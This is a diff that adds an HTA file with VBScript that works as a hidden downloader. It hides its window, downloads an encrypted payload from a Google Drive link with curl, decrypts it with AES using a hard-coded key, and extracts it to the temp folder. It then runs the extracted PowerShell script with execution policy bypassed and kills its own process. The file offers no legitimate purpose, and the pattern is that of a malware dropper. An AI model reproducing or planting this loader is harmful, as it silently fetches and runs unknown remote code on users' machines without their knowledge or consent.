@@ -1,0 +1,54 @@
+<html style="width:0;height:0;overflow:hidden;">
+<head>
+<title>Dl_9f3a7c</title>
+<hta:application
+    id="Downloader"
+    applicationname="Dl_9f3a7c"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize"
+    scroll="no"
+    sysmenu="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    singleinstance="yes" />
+</head>
+<body onload="go()" style="margin:0;padding:0;overflow:hidden;width:0;height:0;">
+<script language="VBScript">
+Option Explicit
+
+Sub go()
+    On Error Resume Next
+    window.resizeTo 0, 0
+    window.moveTo -32000, -32000
+    On Error GoTo 0
+
+    Dim oShell, gngjir, agentCmd, psExe, arch
+    Set oShell = CreateObject("WScript.Shell")
+
+    ' Hide the top-level window via Win32 (retry loop handles startup race)
+    oShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""$s='[DllImport(\""user32.dll\"")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\""user32.dll\"")]public static extern IntPtr FindWindow(string c,string n);';$t=Add-Type -MemberDefinition $s -Name W -Namespace N -PassThru;$h=0;for($i=0;$i -lt 20 -and $h -eq 0;$i++){$h=$t::FindWindow($null,'Dl_9f3a7c');if($h -eq 0){Start-Sleep -Milliseconds 50}};if($h -ne 0){$t::ShowWindow($h,0)}""", 0, False
+
+    arch = oShell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
+    If arch = "AMD64" Then
+        psExe = oShell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
+    Else
+        psExe = oShell.ExpandEnvironmentStrings("%SystemRoot%") & "\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
+    End If
+
+    ' Stage 1 (hidden): download -> decrypt -> extract
+    gngjir = "cmd /c cd /d %TEMP% && if not exist pipe mkdir pipe && curl.exe -L -f -s -S -o enc.bin ""https://drive.google.com/uc?export=download&id=1v_1Yqf7CIhPZ0s-ElLysODng20xmdhJz"" && """ & psExe & """ -NoProfile -Command ""$b=[IO.File]::ReadAllBytes('enc.bin');$k='19078459f518a43212669dd481d27e026df8f7f267828ebed23cb9af32590167' -split '(..)'|?{$_}|%{[Convert]::ToByte($_,16)};$a=[Security.Cryptography.AesManaged]::new();$a.Key=$k;$a.IV=$b[0..15];$a.Mode='CBC';$a.Padding='PKCS7';[IO.File]::WriteAllBytes('pipe\1.zip',$a.CreateDecryptor().TransformFinalBlock($b,16,$b.Length-16))"" && del enc.bin && tar -xf pipe\1.zip -C pipe && del pipe\1.zip"
+    oShell.Run gngjir, 0, True
+
+    ' Stage 2 (hidden now, fire-and-forget): run the agent
+    agentCmd = "cmd /c cd /d """ & oShell.ExpandEnvironmentStrings("%TEMP%") & "\pipe"" && """ & psExe & """ -NoProfile -ExecutionPolicy Bypass -File 1.ps1 & echo AGENT EXIT %errorlevel% >> """ & oShell.ExpandEnvironmentStrings("%TEMP%") & "\run_log.txt"""
+    oShell.Run agentCmd, 0, False
+
+    ' Close + hard-kill our mshta (safety net)
+    window.Close
+    oShell.Run "cmd /c ping -n 2 127.0.0.1 >nul & taskkill /F /IM mshta.exe >nul 2>&1", 0, False
+End Sub
+</script>
+</body>
+</html>
